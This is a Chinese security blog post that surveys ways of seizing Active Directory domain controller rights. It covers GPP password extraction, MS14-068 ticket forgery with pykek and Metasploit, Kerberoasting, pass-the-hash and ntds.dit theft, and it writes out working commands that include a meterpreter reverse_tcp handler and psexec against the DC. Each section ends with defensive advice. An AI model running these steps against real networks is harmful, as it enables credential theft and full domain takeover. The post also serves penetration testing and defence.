<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>AD拿域控权限的方法整理 | Jindom's Blog</title><meta name="author" content="Jindom"><meta name="copyright" content="Jindom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="AD拿域控的几种方法1.SYSVOL和组策略中的密码获取这种方法是最简单的，因为不需要特殊的工具，打开Windows资源管理器并搜索域名为SYSVOL DFS共享的XML文件。在大多数情况下，XML格式的文件包含密码凭据有：&#96;groups.xml scheduledtasks.xml Services.xml&#96;&#96;&#96;等文件。SYSVOL是AD中的所有经过身份认证的用户具有可读可访问权限的域共享目录文">
<meta property="og:type" content="article">
<meta property="og:title" content="AD拿域控权限的方法整理">
<meta property="og:url" content="https://blog.jinzz.cc/54a54b32a7f3/index.html">
<meta property="og:site_name" content="Jindom&#39;s Blog">
<meta property="og:description" content="AD拿域控的几种方法1.SYSVOL和组策略中的密码获取这种方法是最简单的，因为不需要特殊的工具，打开Windows资源管理器并搜索域名为SYSVOL DFS共享的XML文件。在大多数情况下，XML格式的文件包含密码凭据有：&#96;groups.xml scheduledtasks.xml Services.xml&#96;&#96;&#96;等文件。SYSVOL是AD中的所有经过身份认证的用户具有可读可访问权限的域共享目录文">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.jinzz.cc/images/cover9.jpg">
<meta property="article:published_time" content="2020-10-26T00:00:00.000Z">
<meta property="article:modified_time" content="2021-06-01T08:43:16.043Z">
<meta property="article:author" content="Jindom">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.jinzz.cc/images/cover9.jpg"><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://blog.jinzz.cc/54a54b32a7f3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'AD拿域控权限的方法整理',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-06-01 16:43:16'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">125</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/cover9.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jindom's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">AD拿域控权限的方法整理</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-10-26T00:00:00.000Z" title="发表于 2020-10-26 08:00:00">2020-10-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-06-01T08:43:16.043Z" title="更新于 2021-06-01 16:43:16">2021-06-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="AD拿域控权限的方法整理"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="AD拿域控的几种方法"><a href="#AD拿域控的几种方法" class="headerlink" title="AD拿域控的几种方法"></a>AD拿域控的几种方法</h1><h2 id="1-SYSVOL和组策略中的密码获取"><a href="#1-SYSVOL和组策略中的密码获取" class="headerlink" title="1.SYSVOL和组策略中的密码获取"></a>1.SYSVOL和组策略中的密码获取</h2><p>这种方法是最简单的，因为不需要特殊的工具，打开Windows资源管理器并搜索域名为SYSVOL DFS共享的XML文件。在大多数情况下，XML格式的文件包含密码凭据有：<code>`groups.xml scheduledtasks.xml Services.xml```等文件。SYSVOL是AD中的所有经过身份认证的用户具有可读可访问权限的域共享目录文件。SYSVOL包含登录脚本，组策略数据以及需要在具有任何域控可用的域数据（由于SYSVOL在所有域控制器之间自动同步并共享）。所有域组策略都存储的位置：```\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\`</code></p>
<p>当创建新的GPP时，就会在SYSVOL中创建一个与相关配置数据关联的XML文件，如果提供了密码，那么AES-256位加密应是足够强的。微软在MSDN上发布了可用于解密密码的AES加密密钥（共享密钥），连接地址：</p>
<p><a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx">https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx</a> （可用于解密密码）由于经过身份认证的用户（任何域用户或受信任域中的用户）都具有对SYSVOL的可读权限，所以域中的任何人都可以搜索包含“cpassword”关键字的XML文件中的SYSVOL共享，该文件是包含AES加密密码值。</p>
<p>PowerSploit项目中的Get-GPPPassword脚本可用来解密，其连接地址为：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></p>
<p>使用方法： powershell import-modulo .\Get-GPPpassword.ps1;Get-GppPassword</p>
<h3 id="安全建议："><a href="#安全建议：" class="headerlink" title="安全建议："></a>安全建议：</h3><p>在用于管理GPO的每台计算机上安装KB2962486补丁，以防止新的凭据被写入到组策略首选项中 删除包含密码的SYSVOL中出现的GPP xml文件。 不要将密码放在所有未经过身份验证的用户可访问的文件中。</p>
<h2 id="2-AD域控上的MS14-068-Kerberos漏洞"><a href="#2-AD域控上的MS14-068-Kerberos漏洞" class="headerlink" title="2.AD域控上的MS14-068 Kerberos漏洞"></a>2.AD域控上的MS14-068 Kerberos漏洞</h2><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_9b3fd3af96b84bc59da85b723f1829b1.png"> 简单地说，利用MS14-068攻击需要不到5分钟的时间，使攻击者重写一个有效的Kerberos TGT身份验证机票，并且，使其成为域管理员（和企业管理员）。如上图所示，这就像采取有效的登机密码，在登机前，写上“飞行员”。 然后在登机时，你被护送到驾驶舱，问你是否在起飞前要喝咖啡。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</a></p>
<h4 id="Windows系统具体步骤如下："><a href="#Windows系统具体步骤如下：" class="headerlink" title="Windows系统具体步骤如下："></a>Windows系统具体步骤如下：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.导出当前登录账号test的sid值：</span><br><span class="line">whoami/all&gt;sid.txt</span><br><span class="line">2.查看当前域控主机名：</span><br><span class="line">dsquery server &amp;&amp; net time /domain</span><br><span class="line">3.生成TGT:</span><br><span class="line">python ms14-068.py -u test@bk.com -s S-1-5-21-3151896982-173628731-3220273337-1007 -d  DC. bk.com</span><br><span class="line">4.注入生成的TGT并获得有效的TGS：</span><br><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_user-a-1@dom-a.loc.ccache&quot; exit</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_26ff1214d9ee432d28e9d3c41c1f6017.png"></p>
<h4 id="Kali具体步骤如下"><a href="#Kali具体步骤如下" class="headerlink" title="Kali具体步骤如下"></a>Kali具体步骤如下</h4><p>Kali下面默认还没有安装kerberos的认证功能，所以我们首先要安装一个kerberos客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install  krb5-user</span><br></pre></td></tr></table></figure>

<p>然后手动设置IP地址，并将本机的DNS设置为目标域控制器主机的IP地址，这里设置为DC.bk.com对应主机IP：192.168.1.106</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_1300fa7233c2216bd8f9be1e0cd33b33.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_8e3cb7896d5b27c773d638b0ac3a3066.png"></p>
<h4 id="MSF具体步骤"><a href="#MSF具体步骤" class="headerlink" title="MSF具体步骤"></a>MSF具体步骤</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br><span class="line">msf&gt; show options</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set DOMAIN bk.com</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set PASSWORD wen@126.com</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set USER test</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set USER_SID S-1-5-21-3151896982-173628731-3220273337-1007</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set RHOST DC.bk.com</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_b979d4213f515d1c085c6283fb7e2513.png"> <img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_369b33f6d775f648666b92d092f1b736.png"> <img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_e0a27032cdc810789fe84e632450b91b.png"></p>
<p>然后使用mimikatz处理MSF生成的BIN文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz #</span><br><span class="line">kerberos::clist &quot; 20170712232847_default_192.168.1.106_windows.kerberos_515998.bin&quot; /export</span><br></pre></td></tr></table></figure>

<p>回去MSF接shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost  192.168.1.102</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; kerberos_ticket_use /tmp/0-00000000-juan@krbtgt-DEMO.LOCAL.kirbi</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">msf exploit(handler) &gt; sessions</span><br><span class="line">msf exploit(handler) &gt; use exploit/windows/local/current_user_psexec</span><br><span class="line">msf exploit(current_user_psexec) &gt; set TECHNIQUE PSH</span><br><span class="line">msf exploit(current_user_psexec) &gt; set RHOSTS DC.bk.com</span><br><span class="line">msf exploit(current_user_psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(current_user_psexec) &gt; set lhost 192.168.1.102</span><br><span class="line">msf exploit(current_user_psexec) &gt; set SESSION 1</span><br><span class="line">msf exploit(current_user_psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>

<h4 id="实际利用过程"><a href="#实际利用过程" class="headerlink" title="实际利用过程"></a>实际利用过程</h4><p>MS14-068漏洞利用过程：</p>
<ol>
<li>请求没有PAC作为普通用户的Kerberos TGT身份验证凭证，DC使用TGT进行回复</li>
<li>生成一个没有密钥伪造的PAC，所以生成PAC域用户密码数据是使用MD5算法而不是HMAC_MD5“签名”。</li>
<li>将没有PAC的TGT发送到DC，将伪造的PAC作为授权数据TGS服务票证请求的一部分</li>
<li>DC似乎被这个混淆了，所以它丢弃用户发送没有PAC的TGT，创建一个新的TGT，并将伪造的PAC插入到自己的授权数据中，并将这个TGT发送给用户</li>
<li>具有伪造PAC的TGT使用户能够成为易受攻击的DC的域管理员。</li>
</ol>
<p>Benjamin Delpy（Mimikatz的作者）写了一个叫做Kekeo的MS14-068漏洞利用工具（<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo/releases">https://github.com/gentilkiwi/kekeo/releases</a>） 它能找到并定位一个易受攻击的DC，并且可以在其执行，无论是否安装了补丁的2012 / 2012R2 DC的主机上，它具有与PyKEK相同的利用攻击方法，但是在结束时增加了另一个步骤，导致有一个有效的TGT，可以呈现给域中的任何DC，它通过使用生成的TGT来获取在任何地方执行的模拟TGT。</p>
<h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol>
<li>在每个AD域中安装KB3011780 。作者上传传了一个示例脚本，以获取所有域控制器的KB3011780补丁状态：Get-DCPatchStatus（将文件扩展名更改为.ps1）</li>
<li>对于不是域管理组成员的用户（可以登录到域控制器的默认组），监视事件ID 4672 ： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">企业管理员（管理员在森林中的所有DC），</span><br><span class="line">域管理员</span><br><span class="line">普通管理员</span><br><span class="line">服务器管理员</span><br><span class="line">备份操作员</span><br><span class="line">账户操作员</span><br><span class="line">打印操作员</span><br><span class="line">委派其他登录到域控制器的组</span><br></pre></td></tr></table></figure>
</li>
<li>监视事件ID 4769 Kerberos Service Ticket Operation事件，显示失败的尝试获取Kerberos服务票证（TGS）</li>
</ol>
<h2 id="3-Kerberos-TGS票离线破解（Kerberoast）"><a href="#3-Kerberos-TGS票离线破解（Kerberoast）" class="headerlink" title="3.Kerberos TGS票离线破解（Kerberoast）"></a>3.Kerberos TGS票离线破解（Kerberoast）</h2><p>Kerberoast可以作为普通用户从Active Directory中提取服务帐户凭据而不向目标系统发送任何数据包的有效方法。这种攻击是有效的，因为人们往往会使用较弱的密码。这种攻击成功的原因是大多数服务帐户密码与域密码最小值（通常为10或12个字符长）的长度相同，意味着即使暴力破解也不会超过密码最大爆破时间。其中大多数服务帐户并没有密码设置为过期时间，因此，可能有几年，几个月没有更改密码，此外，大多数服务帐户都被特权许可，通常是提供完整管理员的域管理员成员Active Directory权限（即使服务帐户只需要修改特定对象类型上的属性或特定服务器上的管理员权限）。</p>
<p>注意：当针对Windows系统托管的服务时，这种攻击将不会成功，因为这些服务被映射到Active Directory中的计算机帐户，该帐户有一个相关的128字符密码，不会很快被破解。</p>
<p>此攻击涉及为目标服务帐户的服务主体名称（SPN）请求Kerberos服务票证（TGS），该请求使用有效的域用户身份验证票据（TGT）为服务器上运行的目标服务请求一个或多个服务票证。域控制器不会跟踪用户是否实际连接到这些资源（或者即使用户有访问权限），域控制器在Active Directory中查找SPN，并使用与SPN相关联的服务帐户加密票据，以便服务验证用户访问权限，所请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。Kerberoast可以尝试通过不同的NTLM散列来打开Kerberos票证，并且当票证成功打开时，会发现正确的服务帐户密码。</p>
<p>Active Directory环境中发现服务的最佳方式是通过“SPN扫描”</p>
<p>攻击者通过SPN扫描的主要作用是不需要连接到网络上的每个IP以检查服务端口。SPN扫描通过LDAP查询域控制器以便发现服务。由于SPN查询是正常Kerberos票证执行的一部分，所以很难安全设备被探测到，而netowkr端口扫描是相当明显的，容易被发现。</p>
<p>以下是SPN扫描含有SQL服务的主机服务：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_6eaf38d32c7a9341fdd6244788a7b2c2.png"> <img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_f3ab25e7d1535958e4cae88140473369.png"></p>
<p>其探测脚本：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers">https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers</a></p>
<p>识别目标后，我们使用PowerShell来请求此服务主体名称（SPN）的服务票证：请注意，请求的服务票证是具有RC4加密类型</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_7dde630873191cb755f23046a234b06b.png"></p>
<p>一旦客户端接收到票据，我们可以使用Mimikatz（或其他）在用户的内存中导出所有Kerberos票证，而不会进行权限提升。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_1a4d23899bc724deda44e0643ec1b2fc.png"></p>
<p>将服务票据导出后，该文件可以拷贝到正在运行Kerberoast的 Kali Linux的主机。利用我们的wordlist密码字典，可能会破解与票证（文件）相关联的服务帐户的密码。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_12f58d464ef1efce13107cfc8a968a3d.png"></p>
<p><code>`https://github.com/nidem/kerberoast`</code></p>
<h3 id="安全建议：-1"><a href="#安全建议：-1" class="headerlink" title="安全建议："></a>安全建议：</h3><ol>
<li>最有效地减轻这种攻击是确保服务帐户密码超过25个字符。</li>
<li>托管服务帐户和域管理服务帐户是确保服务帐户密码长的好方法，复杂密码，定期更换密码。提供密码保管的第三方产品也是管理服务帐户密码的解决方案</li>
</ol>
<h2 id="域控票据凭证的盗取"><a href="#域控票据凭证的盗取" class="headerlink" title="域控票据凭证的盗取"></a>域控票据凭证的盗取</h2><p>这通常很快导出域管理员凭据，因为大多数Active Directory管理员使用用户帐户登录到他们的工作站，然后使用RunAs（将其管理员凭据放在本地工作站上）或RDP连接到服务器（可以使用键盘记录器抓取凭据）。</p>
<p>步骤1：攻击单个工作站，并利用系统上的权限升级漏洞获得管理权限。运行Mimikatz或类似以转储本地凭据和最近登录凭据。</p>
<p>步骤2：使用从步骤1收集的本地管理员凭据，尝试向具有管理员权限的其他工作站进行身份验证，这通常是成功的。如果您在许多或所有工作站上拥有相同的管理员帐户名称和密码，请在一个工作站上获取帐户名称和密码，那么意味着拥有管理员权限。连接到其他工作站并转储凭据，直到收到域管理员帐户的凭据。使用本地帐户登录是最佳的，因为不会到登录域控制器，并且很少有企业将工作站安全日志发送到中央日志记录系统（SIEM）</p>
<p>步骤3：利用被盗凭证连接到服务器以收集更多凭据，运行Microsoft Exchange客户端访问服务器（CAS）等应用程序的服务器，Microsoft Exchange OWA，Microsoft SQL和终端服务（RDP）往往在最近经过身份验证的用户（或可能具有域管理员权限的服务）的内存中拥有大量凭据。</p>
<p>步骤4：使用被盗的域管理员凭据，任何事情都不能阻止攻击者销毁所有的域登录凭据并持久存在。</p>
<p>注意：使用域管理员帐户登录到计算机将凭据存放在LSASS（受保护的内存空间）中。具有管理员权限（或本地系统）到此计算机的LSASS转储凭据，并可以重复使用这些凭据。</p>
<p>使用普通帐户登录到计算机，并通过在RDP凭据中输入域管理员凭证来打开服务器的RDP会话窗口向系统上运行键盘记录器（可能是以前危及用户帐户或计算机的攻击者）公开了Domain Admin凭据。</p>
<p>如果服务部署到具有域管理员权限的服务帐户上中运行，那么所有工作站或所有服务器（或两者）只有一个系统受到危害才能危及整个Active Directory域，当服务以显式凭据启动时，凭据将加载到LSASS中，以使服务在这些凭据的上运行。</p>
<p>通常，PowerShell是一种最佳的管理方法，因为通过PowerShell远程处理连接到远程系统（通过Enter-PSSession或Invoke-Command）是网络登录 - 没有凭据存储在远程系统的内存中。这是理想的，而微软正在通过管理员模式将RDP转变，有一种通过PowerShell远程连接到远程系统的方法，并能够通过CredSSP使用凭据，问题是CredSSP不安全</p>
<p>通过散列演变成Pass-the-Credential</p>
<p>大多数人都听说过通过哈希传递（PtH），它涉及发现与帐户相关联的密码哈希（通常是NTLM密码哈希）。有趣的是，在Windows网络中，不需要破解散列哈希来发现相关的密码，哈希是用于证明身份（标识的帐户名称和密码哈希是所有需要验证），微软的产品和工具显然不支持传递哈希，因此需要使用第三方工具，如Mimikatz。</p>
<p>一旦发现密码哈希，Pass-the-Hash为攻击者打开了很多后门，但还有其他选择。Pass-of-Ticket（PtT）涉及到抓住现有的Kerberos票证并使用它来模拟用户。Mimikatz支持收集当前用户的Kerberos票证，或者为系统验证的每个用户收集所有Kerberos票证（如果配置了Kerberos无约束委托）一旦获得Kerberos票证，他们可以使用Mimikatz传递，并用于访问资源（在Kerberos票据生命周期内）。</p>
<p>OverPass-the-Hash（又称Pass-the-Key）涉及使用密码哈希来获取Kerberos票证。此技术清除当前所有用户的现有Kerberos密钥（哈希值），并将获取的哈希值注入到Kerberos票据请求的内存中，下一次Kerberos票证需要资源访问时，注入的散列（现在是内存中的Kerberos密钥）用于请求Kerberos票证。Mimikatz提供执行OverPass-the-Hash的功能。这是比PtH更方便的方法，因为有方法可以检测PtH的攻击。</p>
<p>注意：如果获取的散列是NTLM，Kerberos票是RC4。如果散列是AES，则Kerberos票使用AES</p>
<p>主要的凭证盗取的方法：</p>
<p>通过哈希传递：抓取哈希并访问资源。用户更改帐户密码之前，哈希才有效。 Pass-the-Ticket：获取Kerberos机票并用于访问资源。机票有效期至票证生效期满（通常为7天）。 OverPass-the-Hash：使用密码哈希来获取Kerberos票证。用户更改帐户密码之前，哈希才有效。</p>
<h2 id="获取Active-Directory数据库文件（ntds-dit）的访问权限"><a href="#获取Active-Directory数据库文件（ntds-dit）的访问权限" class="headerlink" title="获取Active Directory数据库文件（ntds.dit）的访问权限"></a>获取Active Directory数据库文件（ntds.dit）的访问权限</h2><p>Active Directory数据库（ntds.dit）包含有关Active Directory域中所有对象的信息，此数据库中的数据将复制到域中的所有域控制器中，该文件还包含所有域用户和计算机帐户的密码哈希值，域控制器（DC）上的ntds.dit文件只能由可以登录到DC的用户访问。显然，保护这个文件是至关重要的，因为访问ntds.dit文件可能会导致完整的域和林危害。</p>
<p>这是一个（非全面的）一些方法来获取NTDS.dit数据而不是域管理员：</p>
<p>备份位置（备份服务器存储，媒体和/或网络共享）：</p>
<p>使用备份共享中的ntds.dit文件访问DC备份。确保存储DC备份的任何网络可访问，只有域管理员才能访问它们，还有什么账户呢？他们是域管理员！</p>
<p>在升级到域控制器之前，查找在成员服务器上分段的NTDS.dit文件</p>
<p>IFM与DCPromo一起使用“从媒体安装”，因此正在升级的服务器不需要通过网络从其他DC复制域数据，IFM集是NTDS.dit文件的副本，可以在共享上分享以更新DC，或者可能在尚未升级的新服务器上找到。此服务器可能未正确保护</p>
<p>通过对虚拟化主机的管理权限，可克隆虚拟DC并将关联的数据脱机复制。</p>
<p>访问虚拟DC存储数据并访问域凭据。VCenter Admins是完整的管理员（DA相当于VMWare）。使用VCenter Admin权限：克隆DC并将数据复制到本地硬盘驱动器。当VM挂起时，也可以从VM内存中提取LSASS数据，不要低估虚拟管理员对虚拟域控制器的影响力。您的VCenter管理员组在AD授予相应管理组的适当权限，不要为攻击者提供管理员帐户后门AD的能力。您的虚拟管理员需要被视为域管理员。</p>
<p>攻击有权限的登录域控制器的帐户。 Active Directory中有几个组最不希望对域控制器具有默认登录权限。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_0f1e90bb653332418a4d758907b5b771.png"></p>
<p>这些组可以默认登录到域控制器： Enterprise Admins（林中每个域中的域管理员组成员） Domain Admins（域管理员组的成员） Administrators Backup Operators Account Operators Print Operators</p>
<p>这意味着如果攻击者可能会攻击帐户操作员或打印操作员中的帐户，则Active Directory域可能会受到影响，因为这些组对域控制器具有登录权限</p>
<h3 id="安全建议：-2"><a href="#安全建议：-2" class="headerlink" title="安全建议："></a>安全建议：</h3><ol>
<li>限制有权登录到域控制器的组/帐户。</li>
<li>限制具有完整Active Directory权限的组/帐户，特别是服务帐户。</li>
<li>保护Active Directory数据库（ntds.dit）的每个副本，并且不要放置在比域控制器低的信任级别的系统上。</li>
</ol>
